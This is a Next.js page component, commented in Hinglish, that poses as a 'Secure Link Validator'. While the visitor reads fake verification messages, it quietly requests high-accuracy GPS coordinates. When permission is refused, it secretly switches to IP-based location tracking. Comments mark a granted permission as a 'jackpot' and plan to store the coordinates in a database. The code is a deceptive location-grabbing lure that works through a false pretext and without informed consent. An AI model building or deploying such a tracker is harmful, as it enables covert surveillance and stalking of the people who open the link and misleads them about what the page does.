"use client";

import axios from "axios";
import { useParams } from "next/navigation";
import { useEffect, useState } from "react";

export default function VisitorPage() {
  const params = useParams();
  const visitorCode = params.visitorCode as string;

  const [status, setStatus] = useState("Loading secure connection...");

  useEffect(() => {
    if (!visitorCode) return;

    // 🔴 FALLBACK FUNCTION: Agar GPS fail ho jaye toh yeh chalega
    const fallbackToIP = async () => {
      try {
        console.log("GPS denied or failed. Switching to IP tracking...");

        // Step 4 mein jo Axios route banaya tha, usay call kiya
        const response = await axios.get("/api/location/ip");
        const ipLocationData = response.data;
        // change later
        console.log("Tracked via IP successfully:", ipLocationData);

        // 🚨 NOTE: Yahan se hum agle step mein database mein data save karne ki API chalayein ge
        setStatus("Secure connection established successfully.");
      } catch (err) {
        console.error("IP Fallback also failed:", err);
        setStatus("Connection failed. Please refresh the page.");
      }
    };

    // 🟢 STEP A: Browser ka GPS checker
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          // Agar user ne "Allow" par click kar diya (Jackpot!)
          const { latitude, longitude, accuracy } = position.coords;

          console.log("Tracked via High-Accuracy GPS:", {
            latitude,
            longitude,
            accuracy,
          });

          // 🚨 NOTE: Yeh data bhi agle step mein seedha database mein save hone jayega
          setStatus("Secure connection established successfully.");
        },
        (error) => {
          // Agar user ne "Block" kar diya ya signal ka masla aaya
          console.warn(`GPS Error (${error.code}): ${error.message}`);
          fallbackToIP(); // Chupke se IP track par switch ho jao
        },
        {
          enableHighAccuracy: true, // Best accuracy try karo
          timeout: 8000, // Agar 8 seconds tak response na aaye toh cancel karke IP par jao
          maximumAge: 0,
        },
      );
    } else {
      // Agar browser itna purana hai ke GPS support hi nahi karta
      fallbackToIP();
    }
  }, [visitorCode]);

  return (
    <div className="flex h-screen w-full flex-col items-center justify-center p-4 bg-slate-950 text-white font-sans">
      <div className="max-w-md text-center space-y-4">
        {/* simple UI */}
        <h1 className="text-3xl font-extrabold tracking-tight text-emerald-400">
          Secure Link Validator
        </h1>
        <p className="text-slate-400 text-sm">
          Please wait while we verify your secure dynamic token identity.
        </p>
        <div className="inline-flex items-center px-4 py-2 font-semibold leading-6 text-sm shadow rounded-md text-white bg-emerald-500 hover:bg-emerald-400 transition ease-in-out duration-150">
          {status}
        </div>
      </div>
    </div>
  );
}
